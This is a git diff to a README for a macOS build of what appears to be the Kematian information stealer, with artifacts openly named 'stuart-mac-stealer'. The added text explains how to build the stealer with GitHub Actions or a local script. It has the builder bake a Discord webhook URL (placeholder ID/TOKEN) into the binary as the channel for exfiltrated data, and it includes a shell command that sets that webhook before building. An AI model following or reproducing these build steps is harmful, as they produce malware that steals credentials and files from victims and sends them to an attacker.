@@ -6,23 +6,29 @@ Harvest binary built from **Kematian-main** recovery source (`recovery/` is macO
 
 Overlord uses the separate **Kematian Overlord plugin** on Windows/Linux. This repo is only the independent Mac executable.
 
-## Build (on a Mac)
+## Build on GitHub Actions (recommended)
+
+1. Repo **Settings → Secrets and variables → Actions** → add secret:
+   - `DISCORD_WEBHOOK` = `https://discord.com/api/webhooks/ID/TOKEN`
+2. **Actions → macOS Build (CGO) → Run workflow**
+   - Optional: paste a different webhook in **discord_webhook** (overrides the secret)
+3. Download artifact **stuart-mac-stealer-macos** (`kematian-darwin-arm64`, `kematian-darwin-amd64`, zip)
+
+The webhook is **baked into the binary** at build time (`main.defaultWebhook`). You do not need to pass it at runtime unless you want to override with `-webhook`.
+
+Pushes to `main` and version tags `v*` also run this workflow (uses `DISCORD_WEBHOOK` secret).
+
+## Build locally (on a Mac)
 
 ```bash
 chmod +x scripts/build-macos.sh
-./scripts/build-macos.sh
+DISCORD_WEBHOOK="https://discord.com/api/webhooks/ID/TOKEN" ./scripts/build-macos.sh
 ```
 
 Outputs:
 
 - `dist/kematian-darwin-arm64`
 - `dist/kematian-darwin-amd64`
-
-Optional: bake webhook at build time:
-
-```bash
-DISCORD_WEBHOOK="https://discord.com/api/webhooks/ID/TOKEN" ./scripts/build-macos.sh
-```
 
 Requires **CGO** (`CGO_ENABLED=1`, default on macOS).
 
